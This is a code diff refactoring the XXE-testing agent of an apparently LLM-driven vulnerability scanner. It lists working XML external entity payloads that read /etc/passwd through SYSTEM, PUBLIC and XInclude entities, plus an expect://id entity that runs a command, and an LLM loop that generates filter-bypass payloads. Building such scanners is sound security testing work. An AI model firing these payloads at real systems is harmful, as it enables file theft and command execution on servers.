@@ -33,66 +33,57 @@ class XXEAgent(BaseAgent):
         logger.info(f"[{self.name}] XXE anomaly detected. Marking as VALIDATED_CONFIRMED (Specialist Trust).")
         return "VALIDATED_CONFIRMED"
         
-    async def run_loop(self) -> Dict:
-        logger.info(f"[{self.name}] Testing XML Injection on {self.url}")
-        
-        findings = []
-        previous_response = ""
-        
-        # 1. Basic Payloads (Baseline)
-        initial_payloads = [
-            # Standard General Entity (Level 0)
+    def _get_initial_xxe_payloads(self) -> list:
+        """Get baseline XXE payloads for testing."""
+        return [
             '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>',
-            # Internal Entity (Level 0)
             '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe "BUGTRACE_XXE_CONFIRMED" >]><foo>&xxe;</foo>',
-            # PUBLIC Entity (Bypass for SYSTEM filter - Level 1)
             '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe PUBLIC "bar" "file:///etc/passwd" >]><foo>&xxe;</foo>',
-            # XInclude (Bypass for DOCTYPE/ENTITY filters - Level 2+)
             '<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///etc/passwd" parse="text"/></foo>',
-            # Error-Based detection
             '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///nonexistent_bugtrace_test">]><foo>&xxe;</foo>',
-            # Parameter Entity (Blind/OOB) - using localhost for safe testing
             '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % param_xxe SYSTEM "http://127.0.0.1:5150/nonexistent_oob"> %param_xxe;]><foo>test</foo>',
-            # RCE via expect:// (Level 4+)
             '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>'
         ]
-        
-        successful_payloads = []
-        best_payload = None
-        
+
+    async def _test_heuristic_payloads(self, session) -> tuple:
+        """Test initial payloads and return (successful_payloads, best_payload)."""
+        successful_payloads, best_payload = [], None
+        for p in self._get_initial_xxe_payloads():
+            if await self._test_xml(session, p):
+                successful_payloads.append(p)
+                if not best_payload or ("passwd" in p and "passwd" not in best_payload):
+                    best_payload = p
+        return successful_payloads, best_payload
+
+    async def _try_llm_bypass(self, session, previous_response: str) -> tuple:
+        """Try LLM-driven bypass. Returns (successful_payloads, best_payload)."""
+        for attempt in range(self.MAX_BYPASS_ATTEMPTS):
+            dashboard.log(f"[{self.name}] 🔄 Bypass attempt {attempt+1}/{self.MAX_BYPASS_ATTEMPTS}", "INFO")
+            strategy = await self._llm_get_strategy(previous_response)
+            if not strategy or not strategy.get('payload'):
+                break
+            payload = strategy['payload']
+            if await self._test_xml(session, payload):
+                return [payload], payload
+        return [], None
+
+    async def run_loop(self) -> Dict:
+        logger.info(f"[{self.name}] Testing XML Injection on {self.url}")
+
         async with aiohttp.ClientSession() as session:
             # Phase 1: Heuristic Checks
-            for p in initial_payloads:
-                if await self._test_xml(session, p):
-                    successful_payloads.append(p)
-                    # Keep best payload (critical > high)
-                    if not best_payload or ("passwd" in p and "passwd" not in best_payload):
-                        best_payload = p
-            
-            # Phase 2: LLM-Driven Bypass Loop
-            # Only if heuristics failed
+            successful_payloads, best_payload = await self._test_heuristic_payloads(session)
+
+            # Phase 2: LLM-Driven Bypass (if heuristics failed)
             if not successful_payloads:
-                for attempt in range(self.MAX_BYPASS_ATTEMPTS):
-                    dashboard.log(f"[{self.name}] 🔄 Bypass attempt {attempt+1}/{self.MAX_BYPASS_ATTEMPTS}", "INFO")
-                    
-                    strategy = await self._llm_get_strategy(previous_response)
-                    if not strategy or not strategy.get('payload'):
-                        break
-                    
-                    payload = strategy['payload']
-                    if await self._test_xml(session, payload):
-                        successful_payloads.append(payload)
-                        best_payload = payload
-                        break
-        
+                bypass_payloads, bypass_best = await self._try_llm_bypass(session, "")
+                successful_payloads.extend(bypass_payloads)
+                best_payload = bypass_best
+
         if successful_payloads:
-            findings.append(self._create_finding(best_payload, successful_payloads))
-            return {"vulnerable": True, "findings": findings}
-        
-        return {
-            "vulnerable": False,
-            "findings": []
-        }
+            return {"vulnerable": True, "findings": [self._create_finding(best_payload, successful_payloads)]}
+
+        return {"vulnerable": False, "findings": []}
 
     def _create_finding(self, payload: str, successful_payloads: List[str] = None) -> Dict:
         severity = "HIGH"
